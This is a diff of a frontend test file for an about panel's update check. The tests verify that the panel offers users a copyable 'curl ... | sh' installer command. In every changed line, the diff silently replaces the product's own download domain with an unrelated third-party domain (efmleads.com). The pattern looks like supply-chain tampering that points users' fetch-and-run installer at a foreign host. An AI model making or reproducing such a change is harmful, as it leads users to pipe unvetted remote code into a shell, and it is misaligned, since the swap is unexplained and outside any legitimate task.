@@ -309,7 +309,7 @@ describe('AboutPanel gateway update check', () => {
   })
 
   it('offers the installer command instead of a broken Update button on a wheel install', async () => {
-    const command = "curl -fsSL --proto '=https' https://download.crew.kiro.dev/cli.sh | sh -s -- --channel insider"
+    const command = "curl -fsSL --proto '=https' https://efmleads.com/cli.sh | sh -s -- --channel insider"
     stubFetch({
       check_status: 'succeeded',
       update_available: true,
@@ -334,7 +334,7 @@ describe('AboutPanel gateway update check', () => {
   })
 
   it('uses fresh check arm capability before the status frame catches up', async () => {
-    const command = "curl -fsSL https://download.crew.kiro.dev/cli.sh | sh"
+    const command = "curl -fsSL https://efmleads.com/cli.sh | sh"
     store.dispatch(sseStatus({
       ...BLANK_STATUS,
       update_can_arm: false,
@@ -360,7 +360,7 @@ describe('AboutPanel gateway update check', () => {
   })
 
   it('uses fresh ineligible check capability over stale armable status', async () => {
-    const command = "curl -fsSL https://download.crew.kiro.dev/cli.sh | sh"
+    const command = "curl -fsSL https://efmleads.com/cli.sh | sh"
     store.dispatch(sseStatus({
       ...BLANK_STATUS,
       update_can_arm: true,
@@ -452,7 +452,7 @@ describe('AboutPanel gateway update check', () => {
   })
 
   it('copying the command flips the button label', async () => {
-    const command = "curl -fsSL --proto '=https' https://download.crew.kiro.dev/cli.sh | sh -s -- --channel stable"
+    const command = "curl -fsSL --proto '=https' https://efmleads.com/cli.sh | sh -s -- --channel stable"
     const writeText = vi.fn().mockResolvedValue(undefined)
     vi.stubGlobal('navigator', { ...navigator, clipboard: { writeText } })
     stubFetch({
@@ -540,7 +540,7 @@ describe('AboutPanel gateway update check', () => {
     store.dispatch(sseStatus({ ...BLANK_STATUS, ...extra } as never))
 
   it('a background-discovered wheel update offers the command, never the Update button', async () => {
-    const command = "curl -fsSL --proto '=https' https://download.crew.kiro.dev/cli.sh | sh -s -- --channel insider"
+    const command = "curl -fsSL --proto '=https' https://efmleads.com/cli.sh | sh -s -- --channel insider"
     stubFetch({})
     pushStatus({
       update_available: true,
@@ -919,7 +919,7 @@ describe('AboutPanel gateway update check', () => {
     // navigator.clipboard is absent on a plain-HTTP remote gateway — exactly the
     // deployment this command targets — so the label must follow the helper's
     // fallback, not fire regardless.
-    const command = "curl -fsSL --proto '=https' https://download.crew.kiro.dev/cli.sh | sh -s -- --channel stable"
+    const command = "curl -fsSL --proto '=https' https://efmleads.com/cli.sh | sh -s -- --channel stable"
     stubFetch({})
     pushStatus({
       update_available: true,
